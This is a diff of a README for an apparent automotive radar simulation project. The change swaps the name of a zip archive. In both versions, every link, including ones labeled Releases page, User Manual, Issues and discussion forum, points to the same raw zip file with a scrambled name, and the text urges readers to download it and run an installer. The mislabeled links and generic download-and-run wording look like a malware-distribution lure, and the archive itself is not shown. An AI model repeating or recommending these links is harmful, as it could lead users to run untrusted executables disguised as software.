@@ -1,7 +1,7 @@
 # 🚗 Automotive-77GHz-FMCW-MIMO-Radar - Simulate Advanced Radar Solutions
 
 ## 📦 Download Now
-[![Download](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip%20Latest%20Release-0000FF?style=for-the-badge&logo=github)](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip)
+[![Download](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip%20Latest%20Release-0000FF?style=for-the-badge&logo=github)](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the Automotive 77 GHz FMCW MIMO Radar simulation application. This software helps you simulate an advanced automotive radar system. You will explore range-Doppler processing, CFAR detection, and angle-of-arrival estimation using FFT and MUSIC-based methods.
@@ -23,14 +23,14 @@ This application is suitable for anyone interested in automotive radar technolog
 ## 💡 Installation Steps
 Follow these simple steps to install and run the software:
 
-1. **Visit the Release Page**: Click this link to access the [Releases page](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip).
+1. **Visit the Release Page**: Click this link to access the [Releases page](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip).
 
 2. **Download the Latest Version**: 
    - Look for the latest release at the top of the page.
    - Click on the download link for your operating system.
      - For Windows, you might see a file ending in `.exe`.
      - For MacOS, look for a `.dmg` file.
-     - For Linux, you might download a `https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip` or similar package.
+     - For Linux, you might download a `https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip` or similar package.
 
 3. **Run the Installer**: 
    - Locate the downloaded file in your 'Downloads' folder.
@@ -55,13 +55,13 @@ If you face any issues while downloading or installing, consider these steps:
 - If the application doesn't launch, try reinstalling it from the release page.
 
 ## 🎓 Additional Resources
-- **Documentation**: For detailed insights, check our [User Manual](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip).
-- **Community Support**: Visit our [Issues section](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip) to report problems or ask questions.
+- **Documentation**: For detailed insights, check our [User Manual](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip).
+- **Community Support**: Visit our [Issues section](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip) to report problems or ask questions.
 
 ## 🗨️ Feedback
-Your opinions matter. Share your feedback or suggestions through our [discussion forum](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip). 
+Your opinions matter. Share your feedback or suggestions through our [discussion forum](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip). 
 
 ## ✅ Conclusion
 This software empowers you to understand automotive radar technology through simulation. Enjoy your journey into radar processing! 
 
-[![Download](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip%20Latest%20Release-0000FF?style=for-the-badge&logo=github)](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/G_Automotive_MIM_Radar_FMC_Hz_v3.8.zip)
+[![Download](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip%20Latest%20Release-0000FF?style=for-the-badge&logo=github)](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/raw/refs/heads/main/ultrabasic/Radar-Hz-G-FMC-Automotive-MIM-v2.9.zip)
